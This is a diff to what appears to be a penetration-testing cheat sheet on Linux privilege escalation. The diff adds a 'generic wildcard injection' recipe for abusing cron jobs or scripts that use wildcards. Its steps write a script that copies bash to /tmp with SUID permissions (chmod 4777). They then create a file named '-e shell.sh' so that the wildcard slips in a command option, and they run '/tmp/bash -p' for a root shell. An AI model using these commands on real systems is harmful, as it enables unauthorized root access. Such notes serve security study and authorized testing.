@@ -29,3 +29,18 @@
 #### 5) /tmp/bash -p
 
 ### Note: Do the injection in the correct directory the automated script goes to so that it can actually run the injected commands via tar
+
+## Generic wildcard injection
+
+### Example:
+
+### If you detect a cronjob/script that uses wildcard, chances are that it is vulnerable to wildcard injection.
+
+### 1) echo "cp /bin/bash /tmp/bash; chmod 4777 /tmp/bash" > shell.sh
+
+### 2) chmod +x shell.sh
+
+### 3) touch -- '-e shell.sh'
+
+
+
